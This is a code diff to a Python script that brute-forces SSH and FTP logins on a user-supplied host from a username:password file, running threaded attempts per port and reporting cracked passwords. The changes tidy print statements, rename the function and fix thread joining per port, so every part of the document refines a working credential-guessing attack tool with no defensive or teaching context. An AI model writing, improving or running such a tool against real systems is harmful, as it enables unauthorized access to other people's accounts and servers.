@@ -6,7 +6,7 @@ import termcolor
 import threading
 import time
 
-def ssh_ftp_bruteforce(host, protocol, credentials_file, ports=None):
+def ssh_bruteforce(host, protocol, credentials_file, ports=None):
     stop_flag = 0
     lock = threading.Lock()
     threads = []
@@ -20,12 +20,12 @@ def ssh_ftp_bruteforce(host, protocol, credentials_file, ports=None):
             with lock:
                 stop_flag = 1
             print(termcolor.colored(
-                (f'[+] Found SSH Password: {password}, For Account: {username}, Port: {port}'), 'green'))
+                f'[+] Found SSH Password: {password}, For Account: {username}, Port: {port}', 'green'))
         except paramiko.AuthenticationException:
             print(termcolor.colored(
-                (f'[-] Incorrect SSH Login: {username}:{password}, Port: {port}'), 'red'))
+                f'[-] Incorrect SSH Login: {username}:{password}, Port: {port}', 'red'))
         except Exception as e:
-            print(termcolor.colored((f'[-] SSH Error: {str(e)}, Port: {port}'), 'red'))
+            print(termcolor.colored(f'[-] SSH Error: {str(e)}, Port: {port}', 'red'))
         finally:
             ssh.close()
 
@@ -38,9 +38,9 @@ def ssh_ftp_bruteforce(host, protocol, credentials_file, ports=None):
             with lock:
                 stop_flag = 1
             print(termcolor.colored(
-                (f'[+] Found FTP Password: {password}, For Account: {username}, Port: {port}'), 'green'))
+                f'[+] Found FTP Password: {password}, For Account: {username}, Port: {port}', 'green'))
         except Exception as e:
-            print(termcolor.colored((f'[-] FTP Error: {str(e)}, Port: {port}'), 'red'))
+            print(termcolor.colored(f'[-] FTP Error: {str(e)}, Port: {port}', 'red'))
         finally:
             try:
                 ftp.quit()
@@ -61,6 +61,7 @@ def ssh_ftp_bruteforce(host, protocol, credentials_file, ports=None):
     print(f'* * * Starting Threaded {protocol} Bruteforce On {host} * * *')
 
     for port in ports:
+        threads = []
         with open(credentials_file, 'r') as file:
             for line in file.readlines():
                 with lock:
@@ -80,9 +81,9 @@ def ssh_ftp_bruteforce(host, protocol, credentials_file, ports=None):
                     t.start()
                     time.sleep(1)
 
-    # Wait for all threads to complete
-    for t in threads:
-        t.join()
+        # Wait for all threads to complete for this port
+        for t in threads:
+            t.join()
 
     if stop_flag == 1:
         exit()
@@ -93,4 +94,4 @@ protocol_input = input('[+] Protocol (ssh/ftp): ')
 credentials_file_input = input('[+] Username:Password File: ')
 print('\n')
 
-ssh_ftp_bruteforce(host_input, protocol_input, credentials_file_input)
+ssh_bruteforce(host_input, protocol_input, credentials_file_input)
